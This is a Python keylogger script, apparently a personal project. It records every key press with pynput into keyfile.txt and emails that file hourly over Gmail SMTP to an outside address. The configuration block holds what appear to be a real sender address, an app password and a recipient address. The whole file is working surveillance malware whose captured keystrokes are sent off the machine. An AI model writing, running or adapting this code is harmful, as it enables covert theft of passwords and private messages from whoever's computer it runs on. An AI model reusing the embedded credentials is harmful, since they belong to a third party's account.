#Jacob Beason, 12/9/25
# This program logs keystrokes using pynput and saves them to a txt file, then using SMTP sends the file to an email address
#

import smtplib
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import time

def send_email_with_attachment(sender_email, sender_password, recipient_email, subject, body, file_path, smtp_server="smtp.gmail.com", smtp_port=587):
    
    # Create message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    
    # Attach the body text
    msg.attach(MIMEText(body, 'plain'))
    
    # Open and attach the file
    try:
        with open(file_path, 'rb') as attachment:
            # Create MIMEBase object
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        # Encode file in base64
        encoders.encode_base64(part)
        
        # Add header with filename
        filename = os.path.basename(file_path)
        part.add_header('Content-Disposition', f'attachment; filename= {filename}')
        
        # Attach the file to the message
        msg.attach(part)
        
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found")
        return False
    except Exception as e:
        print(f"Error attaching file: {e}")
        return False
    
    # Send the email
    try:
        # Create SMTP session
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Enable TLS encryption
        
        # Login
        server.login(sender_email, sender_password)
        
        # Send email
        server.send_message(msg)
        server.quit()
        
        print(f"Email sent successfully to {recipient_email}")
        return True
        
    except smtplib.SMTPAuthenticationError:
        print("Authentication failed. Check your email and password.")
        return False
    except smtplib.SMTPException as e:
        print(f"SMTP error occurred: {e}")
        return False
    except Exception as e:
        print(f"Error sending email: {e}")
        return False



    
    
#Counts down desired time between emails  
def email_loop(seconds, num_repetitions=None):
    
    if num_repetitions is None:
        while True:
            send_email_with_attachment(sender_email=SENDER_EMAIL,sender_password=SENDER_PASSWORD,recipient_email=RECIPIENT_EMAIL,subject=subject,body=body,file_path=file_path)
            time.sleep(seconds)
          


# Detects keystrokes and writes them to a txt file
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
                print("Error getting char")


if __name__ == "__main__":
    # Initialize keylogger
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

   

    # Configuration
    SENDER_EMAIL = "bocajj2007@gmail.com"
    SENDER_PASSWORD = "ixan xutp yrgp gpbb"  # Use app-specific password for Gmail
    RECIPIENT_EMAIL = "sprsrr00@gmail.com"
    
    # Email details
    subject = "keylog"
    body = ""
    file_path = "/Users/jacobbeason/python proj/keyfile.txt"  # Path to  file

    #Initalize email loop
    email_loop(3600,None)
    